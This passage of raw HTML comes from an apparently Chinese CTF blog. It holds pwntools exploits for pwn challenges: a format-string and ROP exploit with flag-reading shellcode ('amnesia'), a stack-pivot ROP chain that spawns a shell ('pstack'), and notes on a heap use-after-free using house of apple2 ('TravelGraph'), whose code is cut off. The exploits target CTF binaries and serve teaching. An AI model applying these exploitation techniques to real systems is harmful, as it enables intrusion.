class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./amnesia&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;ctf.tcp1p.team&quot;</span>, <span class="number">20037</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = <span class="string">b&quot;%lu|&quot;</span> * <span class="number">50</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">14</span></span><br><span class="line"></span><br><span class="line">recv = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    recv.append(<span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;|&quot;</span>, drop=<span class="literal">True</span>)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(recv[i]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7eda00e00000 + 0x114887</span></span><br><span class="line">libc_base = recv[<span class="number">2</span>] - <span class="number">0x114887</span></span><br><span class="line">text_base = recv[<span class="number">40</span>] - <span class="number">0x16F7</span></span><br><span class="line">stack_addr = recv[<span class="number">39</span>]</span><br><span class="line"></span><br><span class="line">stack_addr2 = recv[<span class="number">42</span>]</span><br><span class="line">stack_addr3 = recv[<span class="number">43</span>]</span><br><span class="line"></span><br><span class="line">libc_stact_call_main = recv[<span class="number">46</span>]</span><br><span class="line">ret_addr = stack_addr - <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> ret_addr == stack_addr2 - <span class="number">0x150</span></span><br><span class="line"><span class="keyword">assert</span> ret_addr == stack_addr3 - <span class="number">0x140</span></span><br><span class="line"><span class="keyword">assert</span> libc_base == libc_stact_call_main - <span class="number">0x29D90</span></span><br><span class="line"><span class="comment"># 41 ===&gt; ret_addr</span></span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002A3E5</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002BE51</span></span><br><span class="line">pop_rdx_pop_r12 = libc_base + <span class="number">0x000000000011F2E7</span></span><br><span class="line">mprotect = libc_base + libc.sym.mprotect</span><br><span class="line">read = libc_base + libc.sym.read</span><br><span class="line"></span><br><span class="line">str_addr = text_base + <span class="number">0x4010</span></span><br><span class="line">bss_addr = text_base + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%c%c%c%c&quot;</span> * <span class="number">2</span></span><br><span class="line"><span class="comment"># 21</span></span><br><span class="line"><span class="comment"># payload += (b&quot;%c%&quot; + str(0x29 - 19).encode() + b&quot;c%n&quot;).ljust(8, b&quot;\0&quot;)</span></span><br><span class="line">payload += <span class="string">b&quot;%c%c%n&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)</span><br><span class="line">payload += p64(str_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fmt</span>(<span class="params">addr, rop</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        tmp = rop &amp; <span class="number">0xFF</span></span><br><span class="line">        rop = rop &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">        payload = fmtstr_payload(<span class="number">8</span>, &#123;addr + i: tmp&#125;)</span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= <span class="number">32</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fmt(ret_addr, pop_rdi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x8</span>, bss_addr)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x10</span>, pop_rsi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x18</span>, <span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x20</span>, pop_rdx_pop_r12)</span><br><span class="line">fmt(ret_addr + <span class="number">0x28</span>, <span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x38</span>, mprotect)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x40</span>, pop_rdi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x48</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x50</span>, pop_rsi)</span><br><span class="line">fmt(ret_addr + <span class="number">0x58</span>, bss_addr + <span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x60</span>, pop_rdx_pop_r12)</span><br><span class="line">fmt(ret_addr + <span class="number">0x68</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x78</span>, read)</span><br><span class="line"></span><br><span class="line">fmt(ret_addr + <span class="number">0x80</span>, bss_addr + <span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;ber?\n&quot;</span>, <span class="string">b&quot;I remember everything!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov rax, 2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x7478742e67616c66;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">push rcx;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">xor rsi, rsi;</span></span><br><span class="line"><span class="string">xor rdx, rdx;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi, rax;</span></span><br><span class="line"><span class="string">xor rdi, rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string">inc rdi;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">mov rdx, rsp;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov r8, 0x50;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rax, 40;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2.5</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;Congratulations! You have recovered from your amnesia.&quot;</span>, asm(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">47</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(recv[i]))</span><br><span class="line">ls(libc_base)</span><br><span class="line">ls(text_base)</span><br><span class="line">ls(ret_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/08/29/2024ycb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="NazrinDuck">
      <meta itemprop="description" content="Fâtih'in İstanbul'u fethettiği yaştasın!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Blog de Назриндак">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/08/29/2024ycb/" class="post-title-link" itemprop="url">[2024 羊城杯] Pwn writeup(部分)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-08-29 23:11:16" itemprop="dateCreated datePublished" datetime="2024-08-29T23:11:16+08:00">2024-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-10-15 00:22:20" itemprop="dateModified" datetime="2024-10-15T00:22:20+08:00">2024-10-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><hr>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/images/2024ycb/2024-08-29_11-28.png" alt="2024-08-29_11-28"></p>
<p>有两个qword的溢出，checksec发现无pie和canary,直接栈迁移</p>
<p>首先改rbp到bss段上，接着再返回vuln函数在bss段上读入ROP链，然后leave&amp;ret跳转到bss段ROP泄漏libc基址，最后再leave&amp;ret一下拿shell.</p>
<p>注意这个system(“&#x2F;bin&#x2F;sh”)需要很长的栈空间， 迁移的bss段地址要大一点。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">binary_path = <span class="string">&quot;./pstack/pwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&quot;./pstack/libc.so.6&quot;</span></span><br><span class="line"></span><br><span class="line">rop = ROP(binary_path)</span><br><span class="line">elf = ELF(binary_path)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ip, port = <span class="string">&quot;139.155.126.78&quot;</span>, <span class="number">38040</span></span><br><span class="line"><span class="comment"># ip, port = &quot;chall.pwnable.tw&quot;, 1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = process(binary_path)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> p: gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    dbg = <span class="keyword">lambda</span> _: <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ls = <span class="keyword">lambda</span> addr: log.success(<span class="built_in">hex</span>(addr))</span><br><span class="line">recv = <span class="keyword">lambda</span> char: u64(p.recvuntil(char, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search_from_libc</span>(<span class="params">func_name: <span class="built_in">str</span>, func_addr: <span class="built_in">int</span>, libc=libc</span>):</span><br><span class="line">    log.success(func_name + <span class="string">&quot;: &quot;</span> + <span class="built_in">hex</span>(func_addr))</span><br><span class="line">    offset = func_addr - libc.symbols[func_name]</span><br><span class="line">    binsh = offset + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">    system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">    <span class="keyword">return</span> (system, binsh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =================start=================#</span></span><br><span class="line">lev_ret_addr = <span class="number">0x00000000004006DB</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400773</span></span><br><span class="line">ret_addr = <span class="number">0x00000000003FC131</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x4006C4</span></span><br><span class="line">bss_addr = <span class="number">0x601800</span></span><br><span class="line">puts_plt = elf.plt.puts</span><br><span class="line">puts_got = elf.got.puts</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">48</span></span><br><span class="line">payload += p64(bss_addr + <span class="number">0x30</span>)</span><br><span class="line">payload += p64(vuln_addr)</span><br><span class="line">p.sendafter(<span class="string">b&quot;?\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(elf.sym.vuln)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss_addr)</span><br><span class="line">payload += p64(lev_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = recv(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">sys, sh = search_from_libc(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg(p)</span></span><br><span class="line">payload = p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(sh)</span><br><span class="line"><span class="comment"># payload += p64(ret_addr)</span></span><br><span class="line">payload += p64(sys)</span><br><span class="line">payload = payload.ljust(<span class="number">48</span>, <span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload += p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(lev_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h1><hr>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>高版本(libc-2.35)堆题，不过没有去除符号，调试分析起来方便了很多</p>
<p><img src="/images/2024ycb/2024-08-29_12-01.png" alt="2024-08-29_12-01"></p>
<p>开了沙箱，考虑用setcontext+61来控制执行流</p>
<p><img src="/images/2024ycb/2024-08-29_12-50.png" alt="2024-08-29_12-50"></p>
<p>缝了个dijkstra最短路进去，不过这个题的漏洞和算法无关，只是用来拿到edit次数的。</p>
<p><img src="/images/2024ycb/2024-08-29_12-49.png" alt="2024-08-29_12-49"></p>
<p>但是还有一个限制只能编辑一次，不过够用了。</p>
<p>add可以申请三种大小的堆，大小都是large bin范围的</p>
<p><img src="/images/2024ycb/2024-08-29_13-38.png" alt="2024-08-29_13-38"></p>
<p>明显的UAF漏洞，先通过构造堆环境用来泄漏堆地址和libc基地址，edit的输入范围是通过堆上的一个数据确定的，可以通过布置堆环境来拿到任意大小的输入，这里用来修改bk_nextsize的同时布置io链，打house of apple2(感谢学长的指导)</p>
<p><img src="/images/2024ycb/2024-08-29_13-36.png" alt="2024-08-29_13-36"></p>
<p>之后通过一个magic gadget修改rdx为堆地址，利用setcontext+61控制执行流，打orw</p>
<p><img src="/images/2024ycb/2024-08-29_13-45.png" alt="2024-08-29_13-45"></p>
<p>利用的house of apple2中的_IO_wdefault_xsgetsn利用链，在call magic gadget之前的rax,rbx,rdi,r15都是堆地址，rsi是一个固定的值，在堆地址相应位置布置上相应的地址即可成功orw</p>
<p>ps：linux版本太高导致给的libc死活patch不上，报错seccomp版本不对应，导致我本机和远程分别用了不同的magic gadget，痛苦调试很长时间才把远程打通</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span 